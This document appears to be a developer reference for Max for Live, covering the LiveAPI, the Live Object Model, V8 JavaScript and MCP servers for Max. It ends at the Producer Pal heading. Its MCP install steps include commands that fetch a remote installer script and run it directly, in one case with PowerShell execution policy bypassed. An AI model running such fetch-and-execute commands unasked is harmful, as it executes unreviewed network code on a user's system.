# Cycling74 & Max for Live Development Reference

> Comprehensive reference for Max for Live development, JavaScript/V8 integration, LiveAPI, Node for Max, MCP servers, and network testing tools for the coLaB project.
>
> Last updated: 2026-03-21

---

## Table of Contents

1. [API Reference Index](#1-api-reference-index)
2. [LiveAPI JavaScript Reference](#2-liveapi-javascript-reference)
3. [Creating Max for Live Devices (Live API)](#3-creating-max-for-live-devices)
4. [JavaScript Usage in Max](#4-javascript-usage-in-max)
5. [Live Object Model (LOM) Complete Reference](#5-live-object-model-lom)
6. [JS in Live Tutorial Series (Adam Murray)](#6-js-in-live-tutorial-series)
7. [Generating MIDI Clips](#7-generating-midi-clips)
8. [V8 Engine in Max for Live](#8-v8-engine-in-max-for-live)
9. [Max Cookbook: LiveAPI Examples](#9-max-cookbook-liveapi-examples)
10. [Community Tutorials & Forum Insights](#10-community-tutorials--forum-insights)
11. [MCP Servers for Max](#11-mcp-servers-for-max)
12. [Producer Pal MCP](#12-producer-pal-mcp)
13. [Node for Max](#13-node-for-max)
14. [Node for Max vs js Object](#14-node-for-max-vs-js-object)
15. [Max Shell / CLI Integration](#15-max-shell--cli-integration)
16. [Network Testing Tools (Kali Linux)](#16-network-testing-tools-kali-linux)

---

## 1. API Reference Index

Source: https://docs.cycling74.com/apiref/

### Live Object Model (LOM)
| Object | Purpose |
|--------|---------|
| `live.object` | Read/modify Ableton Live state |
| `live.path` | Path-based navigation to Live elements |
| `live.observer` | Monitor property/children changes |
| `live.remote~` | Signal-rate device parameter control |

### Max JavaScript API
| Object | Purpose |
|--------|---------|
| `v8` | Embeds modern JavaScript (V8 engine) in Max patches |
| `v8ui` | JavaScript with UI/drawing capabilities |
| `v8.codebox` | Inline JavaScript code editor in patch |
| `js` | Legacy SpiderMonkey JavaScript (ES5) |
| `jsui` | Legacy JavaScript with UI capabilities |

### Node for Max API
| Object | Purpose |
|--------|---------|
| `node.script` | Launch/control Node.js scripts from Max |
| `node.codebox` | Inline Node.js code editor in patch |
| `node.debug` | Debug Node.js processes in Max |

---

## 2. LiveAPI JavaScript Reference

Source: https://docs.cycling74.com/max8/vignettes/jsliveapi

### Constructor

```javascript
api = new LiveAPI([callback], [path] / [id])
```

**Parameters:**
- `callback` (optional) -- JavaScript function called when LiveAPI references a new Live object or observed property changes
- `path` (optional) -- String path to Live object (e.g., `"live_set tracks 0 devices 0"`)
- `id` (optional) -- Valid Live object identifier (alternative to path)

**CRITICAL:** Cannot be used in JavaScript global code. Use `live.thisdevice` to detect when Max Device is fully loaded before creating LiveAPI objects.

### Properties

| Property | Type | Access | Description |
|----------|------|--------|-------------|
| `id` | String | get/set | Dynamic identifier awarded by Live; do NOT persist across sessions |
| `path` | String | get/set | Quoted path to Live object; stable across Live Set changes |
| `unquotedpath` | String | get | Unquoted version of path property |
| `children` | Array | get | Array of child objects at current path |
| `mode` | Number | get/set | 0 = follows object; 1 = follows UI location |
| `type` | String | get | Object type at current path |
| `info` | String | get | Description including id, type, children, properties, functions |
| `property` | String | get/set | Observed property/child for change notifications |
| `proptype` | String | get | Type of currently observed property |
| `patcher` | Object | get | Patcher passed to constructor |

### Methods

| Method | Parameters | Returns | Description |
|--------|-----------|---------|-------------|
| `getcount(child)` | `child` [string] | number | Count of specified child type at current path |
| `goto(path)` | `path` [string] | -- | Navigate to path; sends id to callback |
| `get(property)` | `property` [string] | value(s) | Retrieve property value(s) |
| `getstring(property)` | `property` [string] | String | Retrieve property as String object |
| `set(property, value)` | `property` [string], `value` [anything] | -- | Set property value(s) |
| `call(function, args)` | `function` [string], `arguments` [anything] | -- | Execute Live function with optional args |

### Complete Example

```javascript
var api = new LiveAPI(sample_callback, "live_set tracks 0");
if (!api) {
    post("no api object\n");
    return;
}
post("api.mode", api.mode ? "follows path" : "follows object", "\n");
post("api.id is", api.id, "\n");
post("api.path is", api.path, "\n");
post("api.children are", api.children, "\n");
post('api.getcount("devices")', api.getcount("devices"), "\n");

api.property = "mute";
post("api.property is", api.property, "\n");
post("type of", api.property, "is", api.proptype, "\n");

function sample_callback(args) {
    post("callback called with arguments:", args, "\n");
}
```

### Observation Pattern

```javascript
function onChange([property, value]) {
    post("Property", property, "changed to", value, "\n");
}

var liveObject = new LiveAPI(onChange, "live_set");
liveObject.property = "tempo";
// Callback fires whenever tempo changes
```

### Threading Constraints

- The LiveAPI object **cannot be created or used** in the high-priority thread (Max 6.0+)
- Use `defer` or `deferlow` objects to requeue messages to the `js` object
- The JavaScript engine in Max always executes code in the low-priority thread

---

## 3. Creating Max for Live Devices

Source: https://docs.cycling74.com/max8/vignettes/live_api

### Two Access Methods

1. **Object-based** -- Use `live.object`, `live.observer`, and `live.path` Max objects (visual patching)
2. **Code-based** -- Use the `js` or `v8` object with the LiveAPI JavaScript interface

### Four Operation Types

| Operation | Description | Object Method | JS Method |
|-----------|-------------|---------------|-----------|
| **Get** | Retrieve property state | `get [property]` message to `live.object` | `api.get("property")` |
| **Set** | Modify property value | `set [property] [value]` to `live.object` | `api.set("property", value)` |
| **Call** | Perform actions (fire clip, etc.) | `call [function]` to `live.object` | `api.call("function", args)` |
| **Observe** | Monitor property changes | `property [name]` to `live.observer` | Set `api.property = "name"` |

### Core Max Objects

#### live.path
Navigates to Live objects. Outputs object IDs from left outlet (follows object) or middle outlet (follows path/selection changes).

```
path live_set tracks 2
```

#### live.object
Accepts ID from `live.path`. Sends get/set/call messages.

```
get volume
set volume 0.8
call fire
```

#### live.observer
Monitors property changes. Receives ID from `live.path`, then monitors specified property.

```
property volume
```

#### live.remote~
Signal-rate control for remotely-mappable parameters. Left inlet accepts signal data instead of message-based commands. Does not affect undo history or automation.

### Path Syntax

All indices are **0-based** (Track 1 = index 0, Track 3 = index 2).

| Target | Path |
|--------|------|
| Live Set | `live_set` |
| Application | `live_app` |
| This Device | `this_device` |
| Track N | `live_set tracks N` |
| Master Track | `live_set master_track` |
| Return Track N | `live_set return_tracks N` |
| Clip Slot | `live_set tracks N clip_slots M` |
| Clip | `live_set tracks N clip_slots M clip` |
| Device | `live_set tracks N devices M` |
| Mixer Volume | `live_set tracks N mixer_device volume` |
| Mixer Sends | `live_set tracks N mixer_device sends M` |
| Scene | `live_set scenes N` |
| Selected Track | `live_set view selected_track` |
| Selected Scene | `live_set view selected_scene` |

### Root Objects

| Root | Purpose |
|------|---------|
| `live_app` | Application controls (browser, zoom, scroll) |
| `live_set` | Song parameters (tracks, clips, tempo) |
| `control_surfaces` | Control surface features |
| `this_device` | Paths relative to current M4L device |

### Canonical Path & Parent

Every object has a unique canonical path. The `canonical_parent` child allows traversal up the hierarchy:

```
goto this_device canonical_parent
```

This retrieves the track containing the current device.

### Object IDs

- Format: `id N` (symbol `id` plus integer)
- `id 0` means no object / nonexistent
- Valid only within the device containing the `live.path`
- Remains unchanged if object moves (with exceptions)
- Never reused within a Max device scope
- Not stored; must re-navigate after loading

### Datatypes

| Type | Description |
|------|-------------|
| `bool` | 0 (false) or 1 (true) |
| `symbol` | Unicode string; double-quote for spaces |
| `int` | 32-bit signed integer |
| `float` | 32-bit float |
| `double` | 64-bit float |
| `beats` | Quarter-note beat time (double) |
| `time` | Seconds or milliseconds (double) |
| `list` | Space-separated values |

### Notifications & deferlow

Changes to Live Sets **cannot** originate from notifications. If you try, you get: `"Changes cannot be triggered by notifications"`. Solution: insert `deferlow` between notification outlet and change message.

### Initialization Pattern

Always use `live.thisdevice` instead of `loadbang` to ensure Live API is initialized:

```
live.thisdevice -> bang -> [your initialization logic]
```

### Volume Control Pattern (Complete)

```
[live.path live_set tracks 1 mixer_device volume]
    |
    v (ID)
[live.object]
    |
    get value -> outputs 0.0 to 1.0
    set value $1 -> sets from slider
```

### Clip Firing Pattern

```
[live.path live_set tracks 0 clip_slots 3 clip]
    |
    v (ID)
[live.object]
    |
    call fire -> fires the clip
```

---

## 4. JavaScript Usage in Max

Source: https://docs.cycling74.com/max8/vignettes/javascript_usage_topic

### Core Objects

| Object | Purpose |
|--------|---------|
| `js` | Legacy SpiderMonkey JS engine (ES5) |
| `jsui` | JS with UI/canvas drawing |
| `jstrigger` | Quick JS expressions |
| `v8` | Modern V8 engine (ES2020+) |
| `v8ui` | V8 with UI capabilities |
| `v8.codebox` | Inline V8 code editor |

### Available Max-Specific Objects in JS

| Object | Purpose |
|--------|---------|
| `Buffer` | Audio buffer access |
| `Dict` | Dictionary manipulation |
| `File` | File I/O operations |
| `Folder` | Directory iteration |
| `Image` | Image manipulation |
| `LiveAPI` | Ableton Live access |
| `Maxobj` | Max object manipulation |
| `MaxobjListener` | Object change monitoring |
| `MGraphics` | Canvas graphics (Cairo-based) |
| `Patcher` | Patcher scripting |
| `PolyBuffer` | Multiple buffer management |
| `Sketch` | OpenGL drawing |
| `SQLite` | Database access |
| `Task` | Scheduled execution |
| `Wind` | Window management |

### Message Handling

Messages sent to `js` invoke methods with the same name:

```javascript
// "foo 1 2 3" invokes:
function foo(a, b, c) {
    post("received", a, b, c, "\n");
}
```

### Special Functions

```javascript
// Handle integers
function msg_int(a) {
    post("received int:", a, "\n");
}

// Handle floats
function msg_float(a) {
    post("received float:", a, "\n");
}

// Handle lists (messages starting with numbers)
function list() {
    post("list has", arguments.length, "elements\n");
    for (var i = 0; i < arguments.length; i++) {
        post("  element", i, "=", arguments[i], "\n");
    }
}

// Catch-all for unmatched messages
function anything() {
    post("message:", messagename, "\n");
    post("inlet:", inlet, "\n");
    post("args:", arrayfromargs(arguments), "\n");
}

// Called when patcher file loads
function loadbang() {
    if (!max.loadbangdisabled) {
        // initialization code
    }
}

// For pattr integration
function getvalueof() {
    return myvalue;
}

function setvalueof(v) {
    myvalue = v;
}

// Embed state in patcher save
function save() {
    embedmessage("restore", param1, param2);
}

// Cleanup when object freed
function notifydeleted() {
    // cleanup code
}
```

### Inlet/Outlet Configuration

```javascript
// Set in global code (runs at load time)
inlets = 3;
outlets = 2;

// Assistance strings
setinletassist(0, "Input 1");
setinletassist(1, "Input 2");
setinletassist(2, "Input 3");
setoutletassist(0, "Output 1");
setoutletassist(1, "Output 2");
```

### Private Functions

```javascript
// Prevent external invocation
myPrivateFunc.local = 1;
function myPrivateFunc() {
    post("cannot be called from outside\n");
}
```

### Arguments Array

```javascript
// jsarguments[0] = filename
// jsarguments[1..n] = user arguments
// jsarguments.length = n + 1
post("script:", jsarguments[0], "\n");
for (var i = 1; i < jsarguments.length; i++) {
    post("arg", i, "=", jsarguments[i], "\n");
}
```

### Global Functions

| Function | Description |
|----------|-------------|
| `post(args...)` | Print to Max console |
| `outlet(index, args...)` | Send data from specified outlet |
| `arrayfromargs(arguments)` | Convert arguments object to array |
| `embedmessage(name, args...)` | Store state for patcher save |
| `messnamed(name, args...)` | Send named message |
| `cpost(args...)` | Print to system console |
| `error(args...)` | Print error to Max console |

---

## 5. Live Object Model (LOM)

Source: https://docs.cycling74.com/apiref/lom/

The LOM describes Live as version **12.3.5** (latest documentation).

### Complete Object Class Hierarchy (43 Classes)

#### Root / Application Objects
| Class | Description |
|-------|-------------|
| `Application` | Live application instance |
| `Application.View` | Application viewing aspects (browser, zoom) |
| `Song` (accessed via `live_set`) | Current Live Set |
| `Song.View` | Session and Arrangement Views |
| `ControlSurface` | Control surface interface |
| `this_device` | Device containing the live.path object |

#### Track & Scene Objects
| Class | Description |
|-------|-------------|
| `Track` | Audio, MIDI, return, or master track |
| `Track.View` | Track viewing aspects |
| `Scene` | Session View clip row |
| `ClipSlot` | Session matrix cell (track x scene intersection) |
| `TakeLane` | Arrangement View take lanes |

#### Clip & Sample Objects
| Class | Description |
|-------|-------------|
| `Clip` | Audio or MIDI clip |
| `Clip.View` | Clip viewing aspects |
| `Sample` | Sample file reference |
| `CuePoint` | Arrangement locator / cue point |

#### Device Objects
| Class | Description |
|-------|-------------|
| `Device` | Base MIDI/audio device |
| `Device.View` | Device viewing aspects |
| `MaxDevice` | Max for Live device |
| `PluginDevice` | VST/AU plugin wrapper |
| `RackDevice` | Instrument/Effect Rack container |
| `RackDevice.View` | Rack viewing aspects |
| `MixerDevice` | Track mixer (volume, pan, sends) |
| `ChainMixerDevice` | Chain mixer in Racks |
| `DeviceParameter` | Automatable parameter |
| `DeviceIO` | Device input/output bus |
| `Chain` | Group device chain |

#### Built-in Instrument Devices
| Class | Description |
|-------|-------------|
| `SimplerDevice` | Simpler sampler instrument |
| `SimplerDevice.View` | Simpler viewing aspects |
| `WavetableDevice` | Wavetable synthesizer |
| `DrumCellDevice` | Drum Sampler |
| `MeldDevice` | Meld synth |
| `RoarDevice` | Roar synth |
| `DriftDevice` | Drift synth |
| `LooperDevice` | Looper instrument |

#### Built-in Audio Effect Devices
| Class | Description |
|-------|-------------|
| `CompressorDevice` | Compressor |
| `Eq8Device` | EQ Eight equalizer |
| `Eq8Device.View` | EQ Eight viewing aspects |
| `HybridReverbDevice` | Hybrid Reverb |
| `SpectralResonatorDevice` | Spectral Resonator |
| `ShifterDevice` | Shifter pitch effect |

#### Drum Rack Objects
| Class | Description |
|-------|-------------|
| `DrumChain` | Drum Rack chain |
| `DrumPad` | Drum pad control |

#### Groove & Tuning Objects
| Class | Description |
|-------|-------------|
| `Groove` | Groove template |
| `GroovePool` | Groove library |
| `TuningSystem` | Pitch tuning system |

### Key Properties by Class

#### Song (live_set)
| Property | Type | Access | Description |
|----------|------|--------|-------------|
| `tempo` | float | get/set | Song tempo in BPM |
| `is_playing` | bool | get | Whether transport is playing |
| `current_song_time` | beats | get | Current playback position |
| `loop` | bool | get/set | Loop enabled |
| `loop_start` | beats | get/set | Loop start position |
| `loop_length` | beats | get/set | Loop length |
| `metronome` | bool | get/set | Metronome enabled |
| `record_mode` | bool | get/set | Record enabled |

**Key Functions:**
- `start_playing()` -- Start transport
- `stop_playing()` -- Stop transport
- `continue_playing()` -- Continue from current position
- `create_scene(index)` -- Create new scene
- `create_midi_track(index)` -- Create MIDI track
- `create_audio_track(index)` -- Create audio track

#### Track
| Property | Type | Access | Description |
|----------|------|--------|-------------|
| `name` | symbol | get/set | Track name |
| `mute` | bool | get/set | Mute state |
| `solo` | bool | get/set | Solo state |
| `arm` | bool | get/set | Record arm state |
| `color` | int | get/set | Track color |
| `has_midi_input` | bool | get | Is MIDI track |
| `has_audio_input` | bool | get | Is audio track |
| `is_grouped` | bool | get | Is in a group |
| `is_foldable` | bool | get | Is a group track |

**Key Functions:**
- `stop_all_clips()` -- Stop all clips on track

**Key Children:**
- `clip_slots` -- List of ClipSlot objects
- `devices` -- List of Device objects
- `mixer_device` -- MixerDevice (volume, pan, sends)

#### Clip
| Property | Type | Access | Description |
|----------|------|--------|-------------|
| `name` | symbol | get/set | Clip name |
| `color` | int | get/set | Clip color |
| `length` | beats | get | Clip length |
| `start_marker` | beats | get/set | Start marker position |
| `end_marker` | beats | get/set | End marker position |
| `loop_start` | beats | get/set | Loop start |
| `loop_end` | beats | get/set | Loop end |
| `looping` | bool | get/set | Loop enabled |
| `is_midi_clip` | bool | get | Is MIDI clip |
| `is_audio_clip` | bool | get | Is audio clip |
| `playing_position` | beats | get | Current playback position |

**Key Functions:**
- `fire()` -- Launch/fire the clip
- `stop()` -- Stop the clip
- `add_new_notes({notes: [...]})` -- Add MIDI notes
- `remove_notes_extended(pitch, pitch_span, time, time_span)` -- Remove notes
- `get_notes_extended(pitch, pitch_span, time, time_span)` -- Get notes
- `select_all_notes()` -- Select all notes
- `replace_selected_notes({notes: [...]})` -- Replace selected notes

#### ClipSlot
| Property | Type | Access | Description |
|----------|------|--------|-------------|
| `has_clip` | bool | get | Whether slot contains a clip |
| `is_playing` | bool | get | Whether clip is playing |
| `is_recording` | bool | get | Whether recording |
| `is_triggered` | bool | get | Whether triggered |

**Key Functions:**
- `create_clip(length)` -- Create empty clip with given length in beats
- `fire()` -- Fire the clip slot
- `stop()` -- Stop the clip slot

**Key Children:**
- `clip` -- The Clip object (may be `id 0` if empty)

#### DeviceParameter
| Property | Type | Access | Description |
|----------|------|--------|-------------|
| `name` | symbol | get | Parameter name |
| `value` | float | get/set | Current value |
| `min` | float | get | Minimum value |
| `max` | float | get | Maximum value |
| `is_enabled` | bool | get | Whether enabled |
| `is_quantized` | bool | get | Whether quantized |

#### MixerDevice
**Key Children:**
- `volume` -- DeviceParameter for volume
- `panning` -- DeviceParameter for pan
- `sends` -- List of DeviceParameter for sends
- `crossfader` -- DeviceParameter (master only)

---

## 6. JS in Live Tutorial Series

Source: https://adammurray.link/max-for-live/js-in-live/

### Tutorial Index

1. **Overview** -- JavaScript capabilities and limitations in Live
2. **Getting Started** -- Setting up M4L device with JavaScript
3. **Real Time MIDI Processing** -- Altering MIDI notes during playback
4. **The Max Console** -- Debugging techniques
5. **The Live API** -- Basics of LiveAPI in JavaScript
6. **Generating MIDI Clips** -- Algorithmic composition

### Key Limitations

JavaScript in Live operates in Max's **low-priority thread**, making it unsuitable for:
- Audio synthesis
- Audio effects processing
- Live performance requiring consistent timing

> "Real time processing in JavaScript in Max for Live should not be relied on for live performance scenarios (unless timing sloppiness and unpredictable latency is acceptable for the style of music)."

### JavaScript Engine Versions

| Version | Engine | Features |
|---------|--------|----------|
| Max 8 (`js` object) | SpiderMonkey | ES5 only. No `let`, `const`, arrow functions, etc. |
| Max 9 (`v8` object) | V8 | Full ES2020+ support. `let`, `const`, `class`, `async/await`, etc. |

Live 12.2+ (released June 2025) includes Max 9 bundled.

### LiveAPI Best Practices

**CRITICAL PATTERN -- Never use LiveAPI in global code:**

```javascript
// WRONG -- will fail
var api = new LiveAPI("live_set");  // Error: Live API not initialized

// CORRECT -- wrap in bang() triggered by live.thisdevice
function bang() {
    var api = new LiveAPI("live_set");
    post("tempo:", api.get("tempo"), "\n");
}
```

**Property Access:**
```javascript
var api = new LiveAPI("live_set");
var tempo = api.get("tempo");       // Read
api.set("tempo", 120);              // Write
```

**Function Calls:**
```javascript
var api = new LiveAPI("live_set");
api.call("start_playing");          // No args
api.call("create_scene", 3);       // With args
```

**Navigation with Paths:**
```javascript
var track = new LiveAPI("live_set tracks 0");
var clip = new LiveAPI("live_set tracks 2 clip_slots 1 clip");
var master = new LiveAPI("live_set master_track");
```

**Three Object Categories:**
1. **Children** -- paths to other objects (list-type children require numeric indices)
2. **Properties** -- accessed via `get()` and `set()` where permitted
3. **Functions** -- called via `call()`

### Boolean Evaluation Caveat

```javascript
// WRONG -- unreliable in Max's JS engine
if (!clipSlot.get("has_clip")) { ... }

// CORRECT -- use explicit comparison
if (clipSlot.get("has_clip") == false) { ... }
```

---

## 7. Generating MIDI Clips

Source: https://adammurray.link/max-for-live/js-in-live/generating-midi-clips/

### Clip Creation Function

```javascript
function makeClip(trackIndex, clipIndex, lengthInBeats) {
    var clipSlot = new LiveAPI("live_set tracks " + trackIndex + " clip_slots " + clipIndex);
    if (clipSlot.get("has_clip") == false) {
        clipSlot.call("create_clip", lengthInBeats);
    }
    var clip = new LiveAPI(clipSlot.unquotedpath + " clip");
    clip.call("remove_notes_extended", 0, 128, 0, clip.get("length"));
    clip.set("start_marker", 0);
    clip.set("end_marker", lengthInBeats);
    clip.set("loop_start", 0);
    clip.set("loop_end", lengthInBeats);
    return clip;
}
```

### Note Structure

Notes passed to `add_new_notes` require:

| Property | Type | Range | Required | Description |
|----------|------|-------|----------|-------------|
| `pitch` | int | 0-127 | Yes | MIDI pitch number |
| `start_time` | float | 0+ | Yes | Beat position relative to clip start |
| `duration` | float | 0+ | Yes | Length in beats |
| `velocity` | int | 0-127 | No | Intensity (0 = note-off) |
| `probability` | float | 0-1 | No | Random note skip probability |
| `velocity_deviation` | float | -- | No | Random velocity variation range |

### Adding Notes

```javascript
clip.call("add_new_notes", {notes: noteArray});
```

### Removing Notes

```javascript
// remove_notes_extended(startPitch, pitchSpan, startTime, timeSpan)
clip.call("remove_notes_extended", 0, 128, 0, clipLength);
// Removes ALL notes (pitch 0-127, full clip length)
```

### Complete Algorithmic Example -- Prime Rhythms

```javascript
var primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41,
              43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97];
var basePitch = 36;
var clipLengthInBeats = 256;

function bang() {
    var clip = makeClip(0, 0, clipLengthInBeats);
    var notes = [];

    for (var i = 0; i < 16; i++) {
        var pitch = basePitch + i;
        var prime = primes[i];

        var noteCounter = 0;
        for (var start = 0; start < 2 * clipLengthInBeats; start++) {
            if (start % prime == 0 && (pitch == basePitch || start > 0)) {
                var velocity = 127 - 100 * (noteCounter % prime) / (prime - 1);
                notes.push({
                    pitch: pitch,
                    start_time: start / 2,
                    duration: 1,
                    velocity: velocity,
                });
                noteCounter++;
            }
        }
    }

    clip.call("add_new_notes", {notes: notes});
}
```

### Important Notes

- Use `clipSlot.unquotedpath` (not `clipSlot.path`) to construct valid sub-paths; the quoted version includes extra quote characters
- The MIDI API changed in Live 11 with MPE introduction; older examples may be incompatible
- Floating-point precision: use 8 decimal places for triplet grids (4 is not enough)
- Shortened note durations prevent overlaps at grid boundaries

---

## 8. V8 Engine in Max for Live

Sources:
- https://adammurray.link/max-for-live/v8-in-live/
- https://adammurray.link/max-for-live/v8-in-live/getting-started/

### Requirements

- Ableton Live 12.2+ (released June 2025) or Max 9 standalone
- Live Suite or Live Standard with Max for Live add-on

### Key Differences from Legacy js Object

| Feature | `js` (Legacy) | `v8` (Modern) |
|---------|--------------|---------------|
| Engine | SpiderMonkey (ES5) | V8 (ES2020+) |
| `let`/`const` | Not supported | Supported |
| Arrow functions | Not supported | Supported |
| `class` syntax | Not supported | Supported |
| `async`/`await` | Not supported | Supported |
| Template literals | Not supported | Supported |
| Destructuring | Not supported | Supported |
| Performance | Slower | Much faster |
| File storage | Requires separate .js file | Code embedded in patch by default |
| Code editor | Max's built-in editor | Monaco editor (macOS, experimental) |

### Creating a v8 Object

1. Add a new object to the Max patch
2. Type `v8` into the object box
3. Lock the patch (Cmd+E / Ctrl+E)
4. Double-click the v8 object to open the JavaScript editor

### External File Mode

```
v8 my-filename.js
```

Saves script as separate file (same behavior as legacy `js` object).

### Inline Code (v8.codebox)

The `v8.codebox` object places the code editor directly in the patch.

**Re-run methods:**
1. Click elsewhere in the patch after code changes
2. Click the hammer icon (recompile) in lower left

**Note:** `v8.codebox` does NOT support the Monaco editor. Code editing requires an unlocked patch; use Cmd+click / Ctrl+click on the recompile icon in unlocked state.

### Best Use Cases

V8 is particularly well-suited for **Max for Live MIDI Tools** (Generators and Transformers) since these operate offline, outside audio signal paths where timing limitations are irrelevant.

### Console Output

```javascript
post("Hello Live!\n");  // \n required for clean line breaks
```

Messages appear concatenated without explicit newline formatting.

### Always Use Max MIDI Effect

For JavaScript-based devices, always use a **Max MIDI Effect** device type. JavaScript is not suitable for synthesizing instruments or implementing audio effects.

---

## 9. Max Cookbook: LiveAPI Examples

Source: https://music.arts.uci.edu/dobrian/maxcookbook/live-api-javascript

### Overview

The Max Cookbook demonstrates programming the Live API using JavaScript within Max for Live, using the `js` object rather than visual patching.

### Required Files

- `LiveAPIviaJS.amxd` -- Max for Live device patch
- `LiveAPIviaJS.js` -- JavaScript file (must be in same folder)

### Setup

1. Download both files to the same directory
2. The `.js` file must be co-located with the `.amxd` file
3. If files are not properly organized, the `js` object will not create the correct number of inlets/outlets

### Related Patterns

- Uses `live.thisdevice` for initialization timing
- Demonstrates property observation callbacks
- Shows dynamic path construction

---

## 10. Community Tutorials & Forum Insights

Source: https://cycling74.com/forums/tutorial-using-the-javascript-live-api-in-max-for-live

### Updated Tutorial Location

Adam Murray's tutorials (originally at compusition.com) are now at:
- **Current:** https://adammurray.link/max-for-live/js-in-live/
- **Archive:** http://web.archive.org/web/20220117221726/http://compusition.com/writings/js-live-api
- **Updated announcement:** https://cycling74.com/forums/updated-javascript-live-api-tutorials

### MIDI API Changes (Live 11+)

The MIDI API changed in Live 11 with the introduction of MPE. Earlier MIDI examples are incompatible with current versions.

### Floating-Point Precision Issue

Community member Sam Tarakajian reported: "4 decimal positions of accuracy doesn't seem to be quite enough. I had to go up to 8 to get my triplets to line up."

**Workarounds:**
- Use shortened note durations to prevent overlaps
- Apply quantization through the Live API
- Compute offsets from the most accurate grid divisions first

---

## 11. MCP Servers for Max

### MaxMSP-MCP-Server (tiianhk)

Source: https://github.com/tiianhk/MaxMSP-MCP-Server

An MCP server enabling LLMs to understand and generate Max patches.

**Prerequisites:**
- Python 3.8+
- uv package manager
- Max 9+ (V8 engine required)

**Installation:**

```bash
# Install uv
# macOS/Linux:
curl -LsSf https://astral.sh/uv/install.sh | sh
# Windows:
powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"

# Clone and setup
git clone https://github.com/tiianhk/MaxMSP-MCP-Server.git
cd MaxMSP-MCP-Server
uv venv
source .venv/bin/activate      # Linux/macOS
# .venv\Scripts\activate       # Windows
uv pip install -r requirements.txt

# Connect to MCP client
python install.py --client claude    # For Claude Desktop
python install.py --client cursor    # For Cursor
```

**License:** MIT

### Extended Fork (ersatzben/maxmsp-mcp)

Source: https://github.com/ersatzben/maxmsp-mcp

Extended fork adding 11 new tools, safety features, and Claude Code integration. 55 commits, 89 stars, 7 forks.

**Claude Code Configuration:**

Add to `~/.claude/settings.json` or project `.mcp.json`:

```json
{
  "mcpServers": {
    "maxmsp": {
      "command": "uv",
      "args": [
        "--directory",
        "/path/to/MaxMSP-MCP-Server",
        "run",
        "server.py"
      ]
    }
  }
}
```

#### Complete MCP Tools Reference

##### Object Creation & Manipulation

| Tool | Signature | Description |
|------|-----------|-------------|
| `add_max_object` | `(position, obj_type, varname, args)` | Create object with type, varname, and arguments |
| `remove_max_object` | `(varname)` | Delete object by variable name |
| `connect_max_objects` | `(src, outlet, dst, inlet)` | Connect outlet to inlet |
| `disconnect_max_objects` | `(src, outlet, dst, inlet)` | Remove connection |
| `move_object` | `(varname, x, y)` | Reposition object in patcher |
| `recreate_with_args` | `(varname, new_args)` | Change creation-time args, preserve connections |
| `autofit_existing` | `(varname)` | Auto-size object based on content |

##### Object Properties & Communication

| Tool | Signature | Description |
|------|-----------|-------------|
| `set_object_attribute` | `(varname, attr, value)` | Modify object attribute |
| `set_message_text` | `(varname, text_list)` | Update message box content |
| `set_number` | `(varname, num)` | Set value for number boxes/sliders |
| `send_bang_to_object` | `(varname)` | Send bang to object |
| `send_messages_to_object` | `(varname, message)` | Send message list to object |

##### Query and Information

| Tool | Signature | Description |
|------|-----------|-------------|
| `get_objects_in_patch` | `()` | Get complete object inventory and connection topology |
| `get_objects_in_selected` | `()` | Get currently selected objects |
| `get_object_attributes` | `(varname)` | Access object's attribute dictionary |
| `get_object_connections` | `(varname)` | Query all connections for object |
| `get_avoid_rect_position` | `()` | Calculate optimal placement avoiding existing objects |
| `list_all_objects` | `()` | List all available Max objects |
| `get_object_doc` | `(name)` | Retrieve documentation from Max's help system |

##### Subpatcher Navigation

| Tool | Signature | Description |
|------|-----------|-------------|
| `create_subpatcher` | `(position, varname, name)` | Create new `p` (subpatcher) object |
| `enter_subpatcher` | `(varname)` | Navigate context into subpatcher |
| `exit_subpatcher` | `()` | Return to parent patcher |
| `get_patcher_context` | `()` | Get current nesting depth and path |
| `add_subpatcher_io` | `(position, io_type, varname)` | Insert inlet/outlet in subpatcher |

##### Safety & Organization

| Tool | Signature | Description |
|------|-----------|-------------|
| `check_signal_safety` | `()` | Analyze for feedback loops, gain issues, missing limiters |
| `encapsulate` | `(varnames, name, varname)` | Group objects into subpatcher maintaining connections |

#### Safety & Validation Features

**Float Argument Enforcement:**
Math objects (`+`, `-`, `*`, `/`, `%`, `pow`, `scale`) and pack/unpack require float arguments. Use STRING arguments to preserve decimals (JSON strips `.0`):

```json
["0", "127", "0", "25."]
```

Use `int_mode=True` to permit integers. Exception: `scale` with output range <=2 auto-detects float intent.

**Dial Range Enforcement:**
- Rejects `live.dial` (suggests standard `dial` with inline attributes)
- Requires `@size` on `dial` objects
- Rejects `@size > 255` (use `extend=True` to bypass)

**Trigger/t Outlet Behavior:**
Requires `trigger_rtl=True` flag confirming understanding that outlets fire right-to-left.

**Collection Embedding:**
Requires `@embed 1` in arguments for persistent data storage.

**Signal Safety Analysis detects:**
- Feedback loop patterns
- High-gain amplification
- Unsafe `comb~` feedback coefficients
- Missing limiters before `dac~` output

**Object Validity Checking:**
Rejects invalid names with suggestions (e.g., `times~` recommends `*~`).

**Parameter Range Validation:**
- `svf~` Q coefficient must be < 1
- `onepole~` frequency minimum 10 Hz

**Large Patch Warning:**
Alerts when root patcher exceeds 80 objects.

#### Architecture

```
+-------------------+     Socket.IO      +-------------------+
|   Claude Code     | <----------------> |    server.py      |
|  (MCP Client)     |     (port 5002)    |  (FastMCP/Python) |
+-------------------+                    +--------+----------+
                                                  |
                                         +--------v----------+
                                         | max_mcp_node.js   |
                                         |   (Node.js)       |
                                         +--------+----------+
                                                  |
                              +-------------------+-------------------+
                              |                                       |
                     +--------v----------+              +-------------v-----------+
                     |   max_mcp.js      |              | max_mcp_v8_add_on.js    |
                     |  (Max js object)  |              |   (Max v8 runtime)      |
                     +-------------------+              +-------------------------+
```

- **server.py** -- Python FastMCP server with Socket.IO, input validation, tool definitions
- **max_mcp_node.js** -- Node.js bridge in Max's `node.script`, mediates Python<->Max
- **max_mcp.js** -- Max-side JS handler for object operations, connections, queries
- **max_mcp_v8_add_on.js** -- V8 module for `boxtext` access and encapsulation

#### Development Workflow

After modifying code:
1. Reload JavaScript objects in Max (double-click to open editor, then close)
2. Restart node.script (`script stop`, then `script start`)

### MaxPy Alternative

GitHub: https://github.com/Barnard-PL-Labs/MaxPy

Translates Max patches to Python for improved AI analysis, then converts back to working patches. Developed by Prof. Mark Santolucito (Barnard College, Columbia University).

---

## 12. Producer Pal MCP

Source: https://github.com/adamjmurray/producer-pal
